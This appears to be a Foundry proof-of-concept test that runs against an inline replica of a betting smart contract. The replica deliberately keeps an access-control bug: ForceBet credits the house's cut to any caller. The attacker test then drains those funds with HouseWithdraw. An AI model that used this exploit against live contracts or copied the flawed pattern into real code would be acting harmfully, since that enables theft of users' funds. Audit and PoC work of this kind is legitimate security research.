// Minimal vulnerable replica (inline — do NOT import from ../src/)
contract BetHorde {
    struct Bet {
        address house;
        address player;
        uint56 price_gwei;
        uint32 odds;
        uint40 timestamp;
    }
    struct House { uint256 balance; bool exists; }

    mapping(uint256 => Bet) public bets;
    mapping(address => House) public houses;

    // Helper to create a bet for the test
    function createBetFor(uint256 bet_id, address house, address player, uint56 price_gwei, uint32 odds, uint40 timestamp) external {
        bets[bet_id] = Bet({house: house, player: player, price_gwei: price_gwei, odds: odds, timestamp: timestamp});
    }

    // Vulnerable: callable by anyone; credits "house take" to msg.sender (caller), not the bet's house
    function ForceBet(uint256 bet_id) external {
        require(bets[bet_id].timestamp + 1 days < block.timestamp, "< 24h old");
        _PlayerWin(bet_id);
        delete bets[bet_id];
    }

    // Minimal _PlayerWin that mis-attributes the house take to msg.sender
    function _PlayerWin(uint256 bet_id) internal {
        Bet memory b = bets[bet_id];
        // pot in wei (price_gwei * odds * 1 gwei)
        uint256 pot = uint256(b.price_gwei) * uint256(b.odds) * 1 gwei;
        // vulnerable: house_take should go to houses[b.house], but goes to houses[msg.sender]
        uint256 house_take = pot / 10; // pretend 10% house take for PoC
        houses[msg.sender].balance += house_take;
        // player would also get winnings (omitted — not needed for this PoC)
    }

    // Open or adjust a house. If funds were pre-credited to your address (by ForceBet),
    // you can open with zero msg.value — demonstrating attacker can later withdraw credited funds.
    function OpenOrAdjustHouse() external payable {
        if(!houses[msg.sender].exists) {
            // Allow opening if there are pre-credited funds or caller sends some value
            require(houses[msg.sender].balance > 0 || msg.value > 0, "Insufficient funds to open");
            houses[msg.sender].exists = true;
        }
        houses[msg.sender].balance += msg.value;
    }

    // Withdraw funds from house (must exist)
    function HouseWithdraw(uint256 amount) external {
        require(houses[msg.sender].exists, "House does not exist");
        require(amount <= houses[msg.sender].balance, "Insufficient funds");
        houses[msg.sender].balance -= amount;
        (bool sent,) = payable(msg.sender).call{value: amount}("");
        require(sent, "Transfer failed");
    }

    // View helper
    function ViewHouseBalance(address h) external view returns (uint256) { return houses[h].balance; }
}

contract BetHordeTest is Test {
    BetHorde target;
    address attacker;
    address player;
    address victimHouse;

    function setUp() public {
        target = new BetHorde();
        attacker = makeAddr("attacker");
        player = makeAddr("player");
        victimHouse = makeAddr("victim");
    }

    function test_attacker_exploits_ForceBet() public {
        // Create a bet that is older than 1 day so ForceBet can be called
        uint256 betId = 1;
        uint56 priceGwei = 1; // small pot
        uint32 odds = 2;
        uint40 ts = uint40(block.timestamp - 2 days);
        target.createBetFor(betId, victimHouse, player, priceGwei, odds, ts);

        // Attacker calls ForceBet and, due to the bug, receives house_take credited to their house balance
        vm.prank(attacker);
        target.ForceBet(betId);

        uint256 credited = target.ViewHouseBalance(attacker);
        assertGt(credited, 0);

        // Now attacker opens a house (no value required because funds were pre-credited)
        vm.prank(attacker);
        target.OpenOrAdjustHouse{value: 0}();

        // Make the contract hold Ether so withdrawal succeeds (the PoC credits accounting balance only)
        vm.deal(address(target), credited);

        // Attacker withdraws the credited funds
        vm.prank(attacker);
        target.HouseWithdraw(credited);

        // Ensure the house accounting balance was drained (attacker effectively escalated funds)
        assertEq(target.ViewHouseBalance(attacker), 0);
    }
}

